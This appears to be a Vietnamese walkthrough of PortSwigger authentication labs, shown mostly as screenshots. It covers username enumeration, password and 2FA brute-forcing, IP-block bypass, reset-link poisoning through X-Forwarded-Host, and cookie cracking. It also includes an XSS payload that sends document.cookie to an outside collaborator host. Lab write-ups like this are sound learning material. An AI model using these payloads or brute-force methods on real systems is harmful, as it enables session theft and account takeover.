![image](https://github.com/user-attachments/assets/4d7a7656-1897-429f-8afe-afbecf47bf82)

![image](https://github.com/user-attachments/assets/414e00a2-ba30-4a8b-9da3-97e913716161)

Tôi login bằng username:password random để bắt tạm request và ném vào trong intruder, brute bằng wordlist mà portswigger cho:

![image](https://github.com/user-attachments/assets/5fc8e68b-8c31-4f72-ae4a-d50e81775edc)

Sau đó hiện ra cái tên adserver kèm với response là invalid password, giờ thì dùng adserver để brute password

![image](https://github.com/user-attachments/assets/16c75b74-dd21-464f-bfb9-49c9f1634bb2)

Thêm được quả pasword là michelle

![image](https://github.com/user-attachments/assets/a05e9c2c-079d-47e4-9f36-91ce7aac689f)

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/b2fc8705-2aac-4d00-9170-a41913f3c762)

![image](https://github.com/user-attachments/assets/adfaee84-8071-456b-a834-f4749dab7cd1)

![image](https://github.com/user-attachments/assets/94006d3d-abed-4c20-b97c-bad17459ced4)

![image](https://github.com/user-attachments/assets/98810bf3-842a-4af2-9e0d-38e6fe8cbdad)

Bài này tôi hơi ngơ, đang hí hoáy thử login wiener:peter lấy cái 2fa xem nó như nào, sau đó tôi nhập bừa và logout, lúc sau mới thấy có cái để check email, vô thử check mail rồi out ra login carlos:montoya, sau đó tôi đang bấm nút thoát nhằm vào wiener:peter để nhập thử thì nó bảo solved
Tóm lại là tôi vô tình giải được mà không có biết

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/444a8fa1-066d-4e66-9846-c26a96fbff2b)

![image](https://github.com/user-attachments/assets/7e93afe9-9b0f-43a2-af9d-a2537f6d7023)

![image](https://github.com/user-attachments/assets/e4bf43db-ea38-49a4-a632-7adeb752062f)

![image](https://github.com/user-attachments/assets/fd1d3be1-adf6-4fd0-af30-2f14312fdadf)

Test qua qua cái chức năng thì tôi thấy bấm quên mật khẩu là nó gửi link về mail, khi bấm vào link là nó dẫn thẳng đến đổi mật khẩu, tôi bật cái intercept lên và nhập mật khẩu mới

![image](https://github.com/user-attachments/assets/f9bd3ad5-9bbf-44ae-bd27-c4ddbc3e6c71)

Nhập xong thì trong cái request có chứa username cần thay đổi, đổi thành carlos là xong

![image](https://github.com/user-attachments/assets/8503b081-8bb2-420f-98d8-f15f2baa5158)

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/7837f255-3968-46c3-81d6-6c9eef6e7580)

Tôi bắt cái request login và thử brute username trước 

![image](https://github.com/user-attachments/assets/659bd638-5a66-4a44-baca-1ed50ed4c3d5)

Có vẻ bài này đã cải tiến, chơi cái username or password rồi nên đổi lại cách làm

![image](https://github.com/user-attachments/assets/f238e60d-978d-4f9b-9c8a-c4f0e757a0ce)

Thôi thì tôi dùng Cluster bomb attack để brute, tức là kiểm tra tất cả các tổ hợp có thể giữa hai wordlist username và password, cái nào dính thì dính 

![image](https://github.com/user-attachments/assets/bf908c59-7efc-4ca9-862a-69528d4360a7)

Đây rồi đây rồi username=apps&password=nicole

![image](https://github.com/user-attachments/assets/7384b027-d6e5-4d98-a618-68d441fa5e9a)

Còn 1 cách nữa là brute username, username đúng thì sẽ là "Invalid username or password" và sai thì là "Invalid username or password.", nó khác nhau ở dấu . và tôi không có để ý chi tiết này

![image](https://github.com/user-attachments/assets/130e187c-4423-4ebf-bd80-87e3b8ab7e59)

![image](https://github.com/user-attachments/assets/0f10f589-296d-4d72-b408-df108e4498f4)

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/98e7bf5e-a61b-466c-a7e0-40c670150610)

Cái thời gian phản hồi, tôi xếp xuôi hay ngược thì có đến vài cái, không biết là như nào cho dù có lấy cái wiener:peter đúng thì nó vẫn...

![image](https://github.com/user-attachments/assets/a8e2df2e-a634-46c0-978b-8f576ddf0fea)

![image](https://github.com/user-attachments/assets/ec8e29db-fff7-4874-9b8c-d941f3ebeacb)

Dùng lại trò cũ vậy...

![image](https://github.com/user-attachments/assets/3b74f061-ab19-4d1c-8288-eaea7d62ec7f)

Treo đấy 1 lúc rồi quay lại thì thấy cái này, bruh

![image](https://github.com/user-attachments/assets/af6aefdd-aa85-4de9-ab65-28f4ef32682a)

Sau 1 lúc đọc tài liệu thì cuối cùng tôi cũng ngộ ra

![image](https://github.com/user-attachments/assets/846eac66-9c48-4c11-ac85-a0d8fc653aea)

![image](https://github.com/user-attachments/assets/ca33fc05-ab85-4110-bbd2-65efea830d33)

Spam cái mật khẩu dài dài ra bởi vì khi đưa vào server, nó sẽ bỏ qua các invalid username và chỉ chỉ valid, việc mật khẩu quá dài sẽ gây lên tình trạng mất thời gian và tôi kiếm được username là arlington, để kiếm chứng điều này thì có thể dùng username wiener

![image](https://github.com/user-attachments/assets/d90af675-099d-4da3-b3c5-80ff4ebb01ba)

![image](https://github.com/user-attachments/assets/78506e04-4270-4bcc-b87f-daa9afff757a)

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/f74210f3-dda7-4129-b549-540d2b72a0e8)

Sau khi brute thì nó như này đây:

![image](https://github.com/user-attachments/assets/ea7dbec1-b382-49a4-b9a8-a16c830b395b)

Sau 3 lần sai mật khẩu là nó như thế, tôi làm hẳn cái payload cách 1 phút gửi 1 lần:

![image](https://github.com/user-attachments/assets/4a30909c-de5d-4026-b888-ed92e68ee2bc)

Sau khi ngồi đợi, tôi tính qua qua có khoảng 100 cái password, tức là phải đợi 100p, tôi nghĩ là tôi nên tìm cách khác thay vì bỏ gần 2 tiếng đợi<br>

Sau 1 lúc nghịch thử thì tôi nhận ra quy luật, gửi sai 2 lần và lần cuối đúng thì nó được reset, tôi làm lại payload để cho nó tự chạy

![image](https://github.com/user-attachments/assets/9192a97e-1bf5-4381-83f4-edfe0f68c5af)

![image](https://github.com/user-attachments/assets/112d3726-32be-45e7-b841-024c352e433f)

![image](https://github.com/user-attachments/assets/59d3699a-c7db-4de7-92b5-aee90715cc5d)

Tôi chỉnh thành so le, 2 lần carlos và 1 lần wiener, cứ như vậy và để nhanh hơn thì tôi dùng python xếp cho dễ dùng:

![image](https://github.com/user-attachments/assets/5ce868f3-74ce-463f-a74c-d06eaa097857)

Và xong:

![image](https://github.com/user-attachments/assets/7c0fb508-5210-4e14-a7fc-6800dcfc6d79)

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/2c7a7ddc-545b-4e67-8a3f-c9815ff0dfc7)

Vào trang web login bừa, bắt request ném vào intruder và dùng Cluster bomb attack chạy thử thôi:

![image](https://github.com/user-attachments/assets/eb41556e-534c-408e-a3e4-ac56ec7e15cd)

Sau 1 lúc thì có cái này:

![image](https://github.com/user-attachments/assets/1d0504ff-4779-4e66-8195-44f2dc620d39)

Tôi check kĩ thì thấy có 1 cái khác hẳn là nó không hiện incorrect gì cả, tôi thử login thì được 

![image](https://github.com/user-attachments/assets/8662646e-e5ed-4d74-8609-e813febc4ede)

![image](https://github.com/user-attachments/assets/466958c6-4152-4706-b60c-c02a5d52fe12)

![image](https://github.com/user-attachments/assets/a47f7c5f-cb99-45c3-b7f7-13eb3679f15e)

Tôi để ý là khi đối với username valid thì nó sẽ có cái "You have made too many incorrect login attempts. Please try again in 1 minute(s)." còn với invalid thì sẽ chỉ có incorrect thôi

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/f1f029e7-72b6-4e5c-824d-e28a37bf2e6a)

Trước tiên là brute password đã 

![image](https://github.com/user-attachments/assets/89e79f59-4bec-4468-bcf3-96630b6999a5)

Sau khi có pass thì vẫn phải xác thực 2fa 

![image](https://github.com/user-attachments/assets/abef6d54-1431-4439-a3aa-93031dc1ead9)

Tiếp tục brute 2fa

![image](https://github.com/user-attachments/assets/183aa8aa-c3f1-4ae1-b9b8-0c55cb44bfb1)

![image](https://github.com/user-attachments/assets/7dba6315-0629-47a7-966a-b11710a86e66)

![image](https://github.com/user-attachments/assets/05adf35b-d67e-42cc-8387-81e04002eedf)

Theo solution của đề thì đơng giản hơn là khi xác thực wiener thì đổi wiener thành carlos

![image](https://github.com/user-attachments/assets/8c32c519-df23-4881-9d4c-66c96bc2cb80)

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/9036bd33-cac4-41bc-8f3c-61bfd7e67a0c)

![image](https://github.com/user-attachments/assets/e2672743-a782-48d0-b7e8-438d24c405d1)

Lần này có cái option chọn stay 

Vào history thì thấy stay-logged-in là encode bằng base64

![image](https://github.com/user-attachments/assets/6e9a6e78-645f-4024-84be-6291bfe3c0af)

![image](https://github.com/user-attachments/assets/e9296ca4-ac5c-4242-99dc-467a262aa113)

Tôi nghi đấy là hash của password nên vác đi hash thử, nó ra thật, giờ thì brute của carlos thôi 

![image](https://github.com/user-attachments/assets/c6dfde21-19b9-4f1f-bc90-29c1b3b61bd2)

![image](https://github.com/user-attachments/assets/0dcc2c53-4fee-48b8-a3a4-203c87d631ff)

Tệ

![image](https://github.com/user-attachments/assets/59bf583d-e5da-43a3-a7ca-95f09aa5fd30)

Sau 1 lúc thì tôi nhận ra phải xóa cái session kia đi vì khi còn session thì tức là vẫn đang là wiener

![image](https://github.com/user-attachments/assets/d1464d25-31a1-4b46-87bd-fbffe94cb1b0)

![image](https://github.com/user-attachments/assets/7e6af92b-fa66-4519-b5d7-e9328c291de1)

![image](https://github.com/user-attachments/assets/20ccffc6-aaff-45d6-a748-d182fde63da8)

Sau đấy tôi mới nhận ra là burp có hỗ trợ chứ không cần phải code tay để tạo mấy cái hash với encode kia....

![image](https://github.com/user-attachments/assets/738b1cd7-9007-46d3-b4f5-a0dfaab22ca4)

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/44cb89b6-e312-4bee-adf1-8e01c51aac4f)

![image](https://github.com/user-attachments/assets/1d75cdfa-e4e2-4ff5-be18-25ad2dc040f8)

Vẫn như trước thôi, tôi nghĩ chắc lần này có biện pháp bảo vệ brute cookie nên tôi lười, chả thèm brute, đi test thử xss đã

![image](https://github.com/user-attachments/assets/e8a9231f-9112-430b-9e91-ab3a98b8e5cd)

![image](https://github.com/user-attachments/assets/4fcd3d89-ee95-4f7b-82ff-b3d8ca2b71b9)

Hoạt động ngon rồi nên cho nó chạy payload `<script>new Image().src = "https://f1hto37uq1fakjzjnlnx4sevfmld93xs.oastify.com/?cookie=" + document.cookie;</script>`

![image](https://github.com/user-attachments/assets/52ee17b9-f885-41aa-8ceb-cf3c381b5504)

Bắt được rồi, ngon

![image](https://github.com/user-attachments/assets/d845adc6-e12c-43b6-8d61-aff02e686eb0)

![image](https://github.com/user-attachments/assets/54ea4d76-a431-4dcd-96eb-3f563ac62df2)

`carlos:26323c16d5f4dabff3bb136f2460a943`, không hiểu sao tôi dùng hashcat mà không có ra 

![image](https://github.com/user-attachments/assets/8f5bdf35-8875-4d23-862f-2e92793d92cb)

Bảo sao....

![image](https://github.com/user-attachments/assets/29f937f7-436e-42d8-be59-ff22c1c7b3e2)

![image](https://github.com/user-attachments/assets/efdc6a37-2d96-41b6-b090-7538810b0b24)

![image](https://github.com/user-attachments/assets/6ec7fde1-c1ce-41ae-a92a-de7601af90a3)

Vậy là password không có trong cái list kia, nếu ban nãy tôi brute thì không thể ra được

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/1233a167-ab93-41ec-969c-533821b2d6d7)

Tôi thử vào forgot password và check thử xem update password nó như nào

![image](https://github.com/user-attachments/assets/a22332bd-7628-450e-960e-0199f5b7e0a1)

![image](https://github.com/user-attachments/assets/c52c79a1-92b0-497a-a50e-c41d77832edf)

Và gửi mail về, trong cái mail thì có cái temp-forgot-password-token 

![image](https://github.com/user-attachments/assets/2690239c-23a2-4e63-b412-ac11ca09370e)

Tôi thêm X-Forwarded-Host vào và chèn link exploit vào, việc thêm tiêu đề X-Forwarded-Host để buộc server tạo liên kết reset mật khẩu trỏ đến exploit, X-Forwarded-Host dùng để cho backend biết host gốc của request khi đi qua proxy hoặc load balancer

![image](https://github.com/user-attachments/assets/c301690c-0e77-4a4a-a114-275a476a31a5)

Vào trong access log của exploit thì thấy cái token 

![image](https://github.com/user-attachments/assets/05dd194c-ec4a-4853-83c5-badf1fe85e34)

Đổi token của request 

![image](https://github.com/user-attachments/assets/c11e872e-2fa8-4346-8c41-c1876a197709)

![image](https://github.com/user-attachments/assets/a014747c-b8df-4426-b171-da61f5f2fe83)

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/747584c8-33fc-497d-997e-a76ed79da9ce)

Giao diện khi đổi mật khẩu có đòi mật khẩu hiện tại để xác nhận 

![image](https://github.com/user-attachments/assets/1377082f-6bf3-44fb-9277-56f44df55bd8)

![image](https://github.com/user-attachments/assets/770a6643-bced-4462-846e-144ea912af2b)

Tôi nhận ra là nếu tôi nhập sai password hiện tại nhưng cả 2 ô new password trùng thì sẽ redirect về login, còn nhập 2 cái new password khác thì hiện ra thông báo mật khẩu sai chứ không redirect

![image](https://github.com/user-attachments/assets/a7ff9eb4-5a63-40f0-a0ee-2d8069b29ffc)

Trường hợp password hiện tại đúng và 2 ô new password khác thì sẽ hiện thông báo 2 cái không trùng 

![image](https://github.com/user-attachments/assets/9eda8e08-3a5d-49b7-aa79-ae0023cf3101)

Ném vào intruder và xem cái nào hiện thông báo 2 cái không trùng thì chính là mật khẩu

![image](https://github.com/user-attachments/assets/2045b415-30fc-4adc-9b72-2712ad2a60fa)






